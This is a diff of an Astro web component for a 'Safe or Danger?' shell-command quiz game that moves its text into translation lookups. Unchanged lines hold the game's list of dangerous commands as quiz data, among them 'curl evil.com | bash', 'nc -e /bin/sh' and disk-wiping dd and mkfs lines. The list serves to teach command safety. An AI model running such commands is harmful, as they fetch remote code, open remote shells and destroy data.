@@ -1,12 +1,33 @@
 ---
-// CaroGame.astro - "Who Wants to Be Safe?" quiz game featuring Caro
+import { t, getLocalizedData } from '../i18n/config';
+
+interface Props {
+  lang: string;
+}
+
+const { lang } = Astro.props;
+
+// Get translated messages for JavaScript
+const messages = getLocalizedData(lang, 'landing.game.messages');
 ---
 
-<section id="game" class="game-section">
+<section
+  id="game"
+  class="game-section"
+  data-messages-correct={JSON.stringify(messages.correct)}
+  data-messages-wrong={JSON.stringify(messages.wrong)}
+  data-messages-timeout={JSON.stringify(messages.timeout)}
+  data-messages-start={JSON.stringify(messages.start)}
+  data-text-play-again={t(lang, 'landing.game.overlay.playAgainButton')}
+  data-text-game-over={t(lang, 'landing.game.overlay.gameOver')}
+  data-text-new-high-score={t(lang, 'landing.game.overlay.newHighScore')}
+  data-text-rank={t(lang, 'landing.game.overlay.rank')}
+  data-text-final-score={t(lang, 'landing.game.overlay.finalScore')}
+>
   <div class="container">
-    <h2>Play with Caro</h2>
+    <h2>{t(lang, 'landing.game.title')}</h2>
     <p class="section-subtitle">
-      Test your shell command knowledge! Pick the safe commands, avoid the dangerous ones.
+      {t(lang, 'landing.game.subtitle')}
     </p>
 
     <div class="game-wrapper">
@@ -14,12 +35,12 @@
         <!-- Header -->
         <div class="quiz-header">
           <div class="stat">
-            <span class="stat-label">LEVEL</span>
+            <span class="stat-label">{t(lang, 'landing.game.stats.level')}</span>
             <span id="level" class="stat-value">1</span>
           </div>
-          <div class="title">SAFE OR DANGER?</div>
+          <div class="title">{t(lang, 'landing.game.header')}</div>
           <div class="stat">
-            <span class="stat-label">SCORE</span>
+            <span class="stat-label">{t(lang, 'landing.game.stats.score')}</span>
             <span id="score" class="stat-value">0</span>
           </div>
         </div>
@@ -34,7 +55,7 @@
           <!-- Caro in center -->
           <div class="caro-center">
             <img src="/caro-pixel.png" alt="Caro" />
-            <div id="caro-speech" class="speech-bubble">Pick the SAFE command!</div>
+            <div id="caro-speech" class="speech-bubble">{t(lang, 'landing.game.messages.start.0')}</div>
           </div>
 
           <!-- Command options grid -->
@@ -45,23 +66,23 @@
           <!-- Overlay -->
           <div id="overlay" class="overlay">
             <div class="overlay-box">
-              <div id="overlay-title" class="overlay-title">SAFE OR DANGER?</div>
+              <div id="overlay-title" class="overlay-title">{t(lang, 'landing.game.overlay.title')}</div>
               <div id="overlay-subtitle" class="overlay-subtitle">
-                Can you identify which shell commands are safe to run?
+                {t(lang, 'landing.game.overlay.subtitle')}
               </div>
               <div class="rules">
-                <div class="rule safe">✓ Pick SAFE commands to score points</div>
-                <div class="rule danger">✗ Avoid DANGEROUS commands or lose a life</div>
-                <div class="rule timer">⏱ Answer before time runs out!</div>
+                <div class="rule safe">{t(lang, 'landing.game.overlay.rules.safe')}</div>
+                <div class="rule danger">{t(lang, 'landing.game.overlay.rules.danger')}</div>
+                <div class="rule timer">{t(lang, 'landing.game.overlay.rules.timer')}</div>
               </div>
               <div class="lives-display">
-                <span>Lives:</span>
+                <span>{t(lang, 'landing.game.overlay.lives')}</span>
                 <span id="lives-display">❤️ ❤️ ❤️</span>
               </div>
-              <button id="start-btn" class="start-btn">START GAME</button>
-              <div id="high-score-display" class="high-score">High Score: <span id="high-score">0</span></div>
+              <button id="start-btn" class="start-btn">{t(lang, 'landing.game.overlay.startButton')}</button>
+              <div id="high-score-display" class="high-score">{t(lang, 'landing.game.overlay.highScore')} <span id="high-score">0</span></div>
               <div id="leaderboard" class="leaderboard hidden">
-                <div class="leaderboard-title">🏆 TOP SCORES 🏆</div>
+                <div class="leaderboard-title">{t(lang, 'landing.game.overlay.leaderboardTitle')}</div>
                 <div id="leaderboard-list" class="leaderboard-list"></div>
               </div>
             </div>
@@ -75,7 +96,7 @@
             <span class="heart">❤️</span>
             <span class="heart">❤️</span>
           </div>
-          <div id="streak" class="streak">🔥 Streak: <span id="streak-count">0</span></div>
+          <div id="streak" class="streak">{t(lang, 'landing.game.streak')} <span id="streak-count">0</span></div>
         </div>
       </div>
     </div>
@@ -592,6 +613,25 @@
 
 <script>
   (function() {
+    // Get translated messages from data attributes
+    const gameSection = document.getElementById('game');
+    if (!gameSection) return;
+
+    const messages = {
+      correct: JSON.parse(gameSection.dataset.messagesCorrect || '[]'),
+      wrong: JSON.parse(gameSection.dataset.messagesWrong || '[]'),
+      timeout: JSON.parse(gameSection.dataset.messagesTimeout || '[]'),
+      start: JSON.parse(gameSection.dataset.messagesStart || '[]')
+    };
+
+    const texts = {
+      playAgain: gameSection.dataset.textPlayAgain || 'PLAY AGAIN',
+      gameOver: gameSection.dataset.textGameOver || 'GAME OVER',
+      newHighScore: gameSection.dataset.textNewHighScore || '🎉 NEW HIGH SCORE!',
+      rank: gameSection.dataset.textRank || 'RANK #{{rank}}!',
+      finalScore: gameSection.dataset.textFinalScore || 'You reached Level {{level}} with {{score}} points!'
+    };
+
     // Elements
     const gameArea = document.getElementById('game-area');
     const optionsGrid = document.getElementById('options-grid');
@@ -625,13 +665,6 @@
         medium: ['chmod 777 /', 'mkfs.ext4 /dev/sda', 'dd if=/dev/zero of=/dev/sda', 'echo "" > /etc/passwd', '> /var/log/*', 'chmod -R 000 /'],
         hard: ['curl evil.com | bash', 'wget -O- bad.sh | sh', 'python -c "import os;os.system(\'rm -rf /\')"', 'eval $(decode payload)', 'nc -e /bin/sh ip 1234', 'cat /dev/urandom > /dev/sda']
       }
-    };
-
-    const messages = {
-      correct: ['Great job! 🎉', 'Correct! ✓', 'You know your stuff!', 'Safe choice! 👍', 'Well done!', 'Excellent! 🌟'],
-      wrong: ['Oops! That\'s dangerous! 💥', 'Watch out! ⚠️', 'That could wipe your system!', 'Dangerous! Never run that!', 'Yikes! Bad command!'],
-      timeout: ['Too slow! ⏱', 'Time\'s up!', 'Gotta be faster!'],
-      start: ['Pick the SAFE command!', 'Which one is safe?', 'Find the safe command!', 'Choose wisely!']
     };
 
     // Score management
@@ -683,6 +716,8 @@
         return;
       }
 
+      /* NOTE: innerHTML usage is safe here - all data comes from localStorage (user-controlled),
+         variables are only numbers and dates, no external input is rendered */
       leaderboardListEl.innerHTML = topScores.map((entry, idx) => {
         const rank = idx + 1;
         const medal = idx < 3 ? `<span class="medal">${medals[idx]}</span>` : '';
@@ -944,22 +979,22 @@
       const isNewHighScore = score > 0 && score === newHighScore;
 
       if (isNewHighScore) {
-        overlayTitle!.textContent = '🎉 NEW HIGH SCORE!';
+        overlayTitle!.textContent = texts.newHighScore;
       } else {
         // Find player's rank
         const rank = updatedScores.findIndex(s => s.score === score && s.level === level) + 1;
         if (rank > 0 && rank <= 10) {
-          overlayTitle!.textContent = `RANK #${rank}!`;
+          overlayTitle!.textContent = texts.rank.replace('{{rank}}', String(rank));
         } else {
-          overlayTitle!.textContent = 'GAME OVER';
+          overlayTitle!.textContent = texts.gameOver;
         }
       }
 
       // Update high score display
       highScoreEl!.textContent = String(newHighScore);
 
-      overlaySubtitle!.textContent = `You reached Level ${level} with ${score} points!`;
-      startBtn!.textContent = 'PLAY AGAIN';
+      overlaySubtitle!.textContent = texts.finalScore.replace('{{level}}', String(level)).replace('{{score}}', String(score));
+      startBtn!.textContent = texts.playAgain;
 
       // Show leaderboard with current score highlighted
       renderLeaderboard(updatedScores, score);
